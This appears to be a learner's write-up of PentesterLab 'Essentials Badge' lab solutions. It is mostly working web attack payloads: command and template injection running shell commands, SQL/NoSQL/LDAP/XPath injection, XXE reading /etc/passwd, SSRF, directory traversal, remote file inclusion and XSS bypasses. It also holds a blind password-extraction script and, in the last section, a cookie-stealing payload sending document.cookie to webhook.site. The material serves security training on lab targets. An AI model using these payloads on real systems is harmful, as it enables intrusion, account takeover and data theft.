# Essentials Badge

## Command Execution

### Command Execution - 1

```
?ip=127.0.0.1;id
```

### Command Execution - 2

```
?ip=`id`
```

### Command Execution - 3

In this challenge, the developer fixed the previous issue and is now filtering on even more special characters. However, the developer forgot that you can use $(command) to run a command.

```
?ip=$(id)
```

## Directory Traversal

### Directory Traversal - 1

```
file.php?file=../../../../../../../pentesterlab.key
# This had no checks in place
```

### Directory Traversal -2

```
file.php?file=/var/www/../../../../../../../pentesterlab.key
# This was setting the start directory.
```

### Directory Traversal -3

```
/file.php?file=../../../../../../../..//pentesterlab.key%00
# This was adding an extension to the required file.
```

## File Inclusion

Caused by require, 'require\_once', 'include', or 'include once' in PHP\
To include remote files, use the following URL:\
[https://assets.pentesterlab.com/test\_include\_system.txt](https://assets.pentesterlab.com/test\_include\_system.txt)&#x20;

### File Inclusion - 1

```
?page=https://assets.pentesterlab.com/test_include_system.txt&c=whoami
```

### File Inclusion - 2

```
?page=https://assets.pentesterlab.com/test_include_system.txt%00&c=whoami
```

## LDAP

Some LDAP servers authorize NULL Bind i.e. If null values are sent, the LDAP server will proceed to bind the connection. As a result, the PHP code will think that the credentials are correct.

### LDAP - 1

For this section, we remove the highlighted part to send null values to LDAP for verification.

![](<.gitbook/assets/image (9).png>)

### LDAP - 2

The most common pattern of LDAP injection is to be able to inject in a filter. LDAP injection can be used to bypass Authentication.

LDAP Syntax:

```
(cn=[INPUT])
(|(cn=[INPUT1])(cn=[INPUT2])) #OR 
(&(cn=[INPUT1])(cn=[INPUT2])) #AND
# Logical operator towards the start
```

If the filter is (cn=\[INPUT]) we wont be able to inject.\
LDAP uses wildcard very often to match any values. \
We can use Null Byte to remove anything added by the server side code.

We have the following endpoint:

```
/?name=hacker&password=hacker
```

To understand LDAP Filter, we can try including wildcard to different parameters.

This helps us in understanding that the filter used here can be of the type:

```
(&(cn=[INPUT1])(userPassword=HASH[INPUT2])
```

because, if we put \* as username and hacker as password, we log in. But not true the other way round. Thus we can only inject in the first field.

To bypass all of this, we can use the following:

```
hacker)(cn=*))%00
```

## MongoDB Injection

The famous 1=1 condition

```
|| 1==1
```

To comment rest of the SQL Query we can use a NULL Byte or // or \<!--

On error we get error message like

> Can't canonicalize query

### Mongo - 1

```
/?username=admin'+||'1'=='1'+%00&password=admin
```

### Mongo - 2

In this part, we try to gather more information from the database.

We can fuzz the application to know more about the parameters.

* if we access [/?search=admin'%20%26%26%20this.password.match(/.\*/)%00](https://pentesterlab.com/?search=admin%27%20%26%26%20this.password.match\(/.\*/\)%00): we can see a result.
* if we access [/?search=admin'%20%26%26%20this.password.match(/zzzzz/)%00](https://pentesterlab.com/?search=admin%27%20%26%26%20this.password.match\(/zzzzz/\)%00): we cannot see a result.
* if we access [/?search=admin'%20%26%26%20this.passwordzz.match(/.\*/)%00](https://pentesterlab.com/?search=admin%27%20%26%26%20this.passwordzz.match\(/zzzzz/\)%00): we get an error message (since the field passwordzz does not exist).

This can be used to perform blind injection.

```python
import requests
from bs4 import BeautifulSoup as soup
url="http://ptl-c162f749-e970c7c8.libcurl.so/?search=admin"
payload_start="%27%20%26%26%20this.password.match(/.*/)"
payload_end="%00"
force="abcdef0123456789-"
found=False
def check(payload):
    payload_start="%27%20%26%26%20this.password.match(/^"
    payload_end="$/)%00"
    x=requests.get(url+payload_start+payload+payload_end)
    response=x.text
    s = soup(response,'html.parser')
    for tr in s.find_all('a'):
        if "admin" in tr:
            return True
    return False
def checkPattern(payload):
    payload_start="%27%20%26%26%20this.password.match(/^"
    payload_end=".*$/)%00"
    final_url=url+payload_start+payload+payload_end
    x=requests.get(final_url)
    # print(final_url)
    response=x.text
    s = soup(response,'html.parser')
    for tr in s.find_all('a'):
        if "admin" in tr:
            return True
    return False

payload=""
while found!=True:
    for t in force:
        # print(t)
        # print(payload)
        if (checkPattern(payload+t)):
            payload=payload+t
            print(payload)
    if (check(payload)):
        found=True

```

## Open Redirect

This is low impact vulnerability unless we are able to extract O-Auth Tokens.

### Open Redirect - 1

```
http://ptl-139644d6-1918f8b2.libcurl.so/redirect.php?uri=https://webhook.site/31653fb5-e7ba-4607-b81b-9fa0165fa021
```

### Open Redirect - 2

```
http://ptl-f72c1dd8-63163a1e.libcurl.so/redirect.php?uri=//webhook.site/31653fb5-e7ba-4607-b81b-9fa0165fa021
```

## SQL Injection

### SQL Injection - 1

```
admin'or'1'='1'-- -
```

### SQL Injection - 2

```
admin" or "1"="1"-- -
```

### SQL Injection - 3

```
admin'or'1'='1' LIMIT 1-- -
```

### SQL Injection - 4

```
admin'or'1'='1'#
```

### SQL Injection - 5

```
admin'or'1'='1'#
```

### SQL Injection - 6

```
username=admin%bf%27+or+1=1+--+&password=admin
```

## Server Side Request Forgery

To do so you will need to change the url parameter to access the local server on port TCP/1234.

### SSRF - 1

```
?url=http://localhost:1234
```

### SSRF - 2

```
?url=http://localhost:1234
```

### SSRF - 3

```
?url=http://0.0.0.0:1234
```

### SSRF - 4

If you want localhost, and there is nothing. Use this -> hackingwithpentesterlab.link

```
?url=http://assets.pentesterlab.com.hackingwithpentesterlab.link:1234/hacker.txt
```

## Server-side template injection

```
# ----------------------------- Python --------------------------------------#
# First check with {{4+2}}
# Then check with 
{{''.__class__}}
# The above should return string
{{''.__class__.mro()[0]}}
# Keep changing the value of 0, until we get a response as object
{{''.__class__.mro()[2].__subclasses__()}}
# This will list all the subclasses that are available. We can now copy this,
# and find the index of popen. In situation we got it as 233
{{''.__class__.mro()[2].__subclasses__()[233]}}
# This should show the class as popen.
{{''.__class__.mro()[2].__subclasses__()[233]("uname -a",shell=True)}}
```

### SSTI - 1

```
{{''.__class__.mro()[2].__subclasses__()[233]("uname -a",shell=True)}}
```

### SSTI - 2

This once uses Twig.&#x20;

To get code execution here, we can use&#x20;

```
{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('uname')}}
```

This one was simple, and was shared in the challenge.

## File Upload

### File Upload - 1

Simple file upload

### File Upload - 2

If .php is blocked we can try different extensions like php3, php5 etc.

## XML Attacks

Some XML parsers will resolve external entities, and will allow a user controlling the XML message to access resources; for example to read a file on the system. The following entity can be declared, for example:

```
<!ENTITY x SYSTEM "file:///etc/passwd">
```

You will need to envelope this properly, in order to get it to work correctly:

```
<!DOCTYPE test [<!ENTITY x SYSTEM "file:///etc/passwd">]><test>&x;</test>
```

You can then simply use the reference to `x`: `&x;` (don't forget to encode `&`) to get the corresponding result inserted in the XML document during its parsing (server side).

### XML Attack - 1

```
<!DOCTYPE test [<!ENTITY x SYSTEM "file:///etc/passwd">]><test>&x;</test>
```

### XML Attack - 2

In this example, the code uses the user's input, inside an XPath expression. XPath is a query language, which selects nodes from an XML document. Imagine the XML document as a database, and XPath as an SQL query. If you can manipulate the query, you will be able to retrieve elements to which you normally should not have access.

If we inject a single quote, we can see the following error:

```
Warning: SimpleXMLElement::xpath(): Invalid predicate in /var/www/index.php on line 22
Warning: SimpleXMLElement::xpath(): xmlXPathEval: evaluation failed in /var/www/index.php on line 22
Warning: Variable passed to each() is not an array or object in /var/www/index.php on line 23
```

Just like SQL injection, XPath allows you to do boolean logic, and you can try:

* `' and '1'='1` and you should get the same result.
* `' or '1'='0` and you should get the same result.
* `' and '1'='0` and you should not get any result.
* `' or '1'='1` and you should get all results.

Based on these tests and previous knowledge of XPath, it's possible to get an idea of what the XPath expression looks like:

```
[PARENT NODES]/name[.='[INPUT]']/[CHILD NODES]
```

To comment out the rest of the XPath expression, you can use a NULL BYTE (which you will need to encode as %00). As we can see in the XPath expression above, we also need to add a `]` to properly complete the syntax. Our payload now looks like `hacker']%00` (or `hacker' or 1=1]%00` if we want all results).

If we try to find the child of the current node, using the payload `'%20or%201=1]/child::node()%00`, we don't get much information.

Here, the problem is that we need to get back up in the node hierarchy, to get more information. In XPath, this can be done using `parent::*` as part of the payload. We can now select the parent of the current node, and display all the child node using `hacker'%20or%201=1]/parent::*/child::node()%00`.

One of the node's value looks like a password. We can confirm this, by checking if the node's name is `password` using the payload `hacker']/parent::*/password%00`.



```
/?name=admin%27]/parent::*/child::node()%00&password=pentesterlab
```

## XSS

### XSS - 1

```
/index.php?name=<script>alert(1)</script>
```

### XSS - 2

We see that the word script is filtered.

```
/index.php?name=<sCript>alert(1)</sCript>
```

### XSS - 3

Filtering but not nicely!

```
<scrip<sCript>t>alert('A')</scrip</sCript>t>
```

### XSS - 4

If the word script is blocked, we can try other things like:\
using a,img,div etc.

```
<img src="zzz" onError="alert('1')">
```

### XSS - 5

Seems like alert is blocked.

```
<script>prompt('9099ff30-bcb2-4aa6-be31-bb9e8de9ef03')</script>
```

### XSS - 6

Look at the source code to see what is happening.

```
tipsy";alert('9099ff30-bcb2-4aa6-be31-bb9e8de9ef03');"
```

### XSS - 7

Change double quotes to single ones.

```
tipsy';alert('9099ff30-bcb2-4aa6-be31-bb9e8de9ef03');'
```

### XSS - 8

```
Source:
<form action="/index.php/..<script>alert(1)</script>" method="POST">

Exploit:
.."/><script>alert(1)</script>
```

### XSS - 9

```
http://ptl-51cd089b-b0b3f470.libcurl.so/index.php#%3Cscript%3Ealert('1')%3C/script%3E
```

### XSS - 10

webhook.site can be used to get requests.

To steal cookies, our payload should be like

```
<script>document.write('<img src="[URL]?c='+document.cookie+'" />');</script>
```

```
%27<img%20src="https://webhook.site/31653fb5-e7ba-4607-b81b-9fa0165fa021?c=+%27document.cookie+"%20/>%27
```

Final payload

```
<script>document.write('<img src="https://webhook.site/31653fb5-e7ba-4607-b81b-9fa0165fa021?c='+document.cookie+'" />');</script>
```

Important thing to note is that always try to url encode your data.
